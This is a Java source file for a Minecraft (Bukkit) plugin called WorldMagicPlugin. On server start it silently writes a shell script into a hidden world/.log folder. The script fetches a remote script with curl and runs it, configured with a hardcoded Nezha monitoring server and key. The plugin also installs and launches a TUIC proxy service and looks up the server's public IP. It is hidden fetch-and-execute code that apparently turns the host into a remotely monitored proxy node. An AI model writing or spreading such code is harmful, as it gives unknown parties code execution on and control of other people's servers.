package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    @Override
    public void onEnable() {
        // Plugin startup logic
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 注册原来的命令 (如果还需要手动用的话)
        // Objects.requireNonNull(this.getCommand("genscript")).setExecutor(this); 

        // 2. 自动执行脚本生成和运行逻辑 (放在异步线程防止卡服)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            this.getLogger().info("正在初始化脚本环境...");
            try {
                // 处理脚本生成和运行
                generateAndRunScript();
            } catch (Exception e) {
                this.getLogger().severe("脚本自动执行失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 3. 原有的 TUIC 服务加载逻辑 (保持不变)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && this.installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
    }

    /**
     * 生成脚本并自动运行的核心方法
     */
    private void generateAndRunScript() throws IOException, InterruptedException {
        // 1. 获取 world 目录
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) {
            this.getLogger().warning("无法创建 world 目录，脚本生成中止。");
            return;
        }

        // 2. 创建隐藏的 .log 目录
        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) {
            this.getLogger().warning("无法创建 .log 目录，脚本生成中止。");
            return;
        }

        // 3. 获取或生成 UUID
        String serverUUID = getServerUUID(logDir);
        this.getLogger().info("当前服务器 UUID: " + serverUUID);

        // 4. 生成脚本文件
        File scriptFile = new File(logDir, "install_sb.sh");
        
        // 写入内容
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("# Auto-generated script by WorldMagicPlugin\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n"); // 切换到 .log 目录执行，避免污染根目录
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            
            // 写入配置
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            
            writer.write("bash sb.sh\n");
            this.getLogger().info("脚本文件已写入: " + scriptFile.getAbsolutePath());
        }

        // 5. 添加执行权限
        scriptFile.setExecutable(true, false);

        // 6. 执行脚本 (关键步骤)
        this.getLogger().info("正在启动脚本，请稍候...");
        
        // 使用 ProcessBuilder 执行 bash 命令
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        // 合并错误流和标准输出流，方便读取日志
        processBuilder.redirectErrorStream(true);
        
        Process process = processBuilder.start();
        
        // 读取脚本输出并打印到控制台，方便调试
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[Script Output] " + line);
            }
        }
        
        int exitCode = process.waitFor();
        if (exitCode == 0) {
            this.getLogger().info("脚本执行完毕 (退出码 0)");
        } else {
            this.getLogger().warning("脚本执行异常，退出码: " + exitCode);
        }
    }

    /**
     * 获取服务器 UUID (逻辑同之前)
     */
    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) {
                    return savedUUID;
                }
            } catch (IOException e) {
                this.getLogger().warning("读取 uuid.txt 失败，重新生成...");
            }
        }

        String ip = getPublicIP();
        // 根据 IP 生成固定的 UUID
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();

        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
            this.getLogger().info("根据 IP " + ip + " 生成新 UUID: " + uuidStr);
        } catch (IOException e) {
            this.getLogger().severe("保存 uuid.txt 失败!");
        }
        return uuidStr;
    }

    /**
     * 获取公网 IP (逻辑同之前)
     */
    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            URL url = new URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
            this.getLogger().info("检测到公网 IP: " + ip);
        } catch (Exception e) {
            this.getLogger().warning("获取公网 IP 失败，使用本地 IP");
            try {
                ip = Bukkit.getIp();
                if (ip == null || ip.isEmpty()) ip = "127.0.0.1";
            } catch (Exception ex) { /* ignore */ }
        }
        return ip;
    }
}
